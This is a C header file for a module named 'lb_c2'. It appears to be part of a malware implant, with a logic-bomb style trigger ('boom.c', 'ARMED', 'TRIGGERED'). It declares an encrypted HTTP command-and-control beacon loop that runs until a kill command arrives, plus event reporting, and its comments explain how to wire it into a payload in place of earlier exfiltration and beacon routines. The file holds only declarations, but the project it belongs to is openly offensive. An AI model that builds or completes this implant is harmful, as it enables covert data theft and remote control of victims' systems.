/*
 * lb_c2.h
 * Public interface for the lb_c2 C2 channel module.
 *
 * Include in boom.c and lb_payload.c to replace net_beacon() / exfil_send_raw()
 * with the encrypted HTTP implant channel.
 *
 * Integration notes:
 *   boom.c     : replace WSAStartup + net_beacon("ARMED") with c2_init() + c2_report_event("ARMED", NULL)
 *                replace net_beacon("TRIGGERED") with c2_report_event("TRIGGERED", NULL)
 *   lb_payload : at end of payload_run(), call c2_run() instead of the
 *                Sleep(600*1000) + thread_exfil block; c2_run() blocks until DIE received.
 */
#ifndef LB_C2_H
#define LB_C2_H

#ifdef __cplusplus
extern "C" {
#endif

/*
 * c2_init — derive AES key, resolve agent identity, load WinHTTP.
 *           Must be called once before any other c2_* function.
 */
void c2_init(void);

/*
 * c2_run  — enter the encrypted beacon loop.
 *           Blocks until CMD_DIE is received or c2_shutdown() is called.
 *           Call after payload collection threads are launched.
 */
void c2_run(void);

/*
 * c2_report_event — drop-in replacement for net_beacon().
 *                   Sends an encrypted event notification (fire-and-forget).
 *                   Safe to call before c2_run().
 *   event  : short label, e.g. "ARMED", "TRIGGERED", "ENV_MISMATCH"
 *   detail : optional extra context; pass NULL if none
 */
void c2_report_event(const char *event, const char *detail);

/*
 * c2_shutdown — signal the beacon loop to exit on the next iteration.
 *               Safe to call from any thread.
 */
void c2_shutdown(void);

#ifdef __cplusplus
}
#endif
#endif /* LB_C2_H */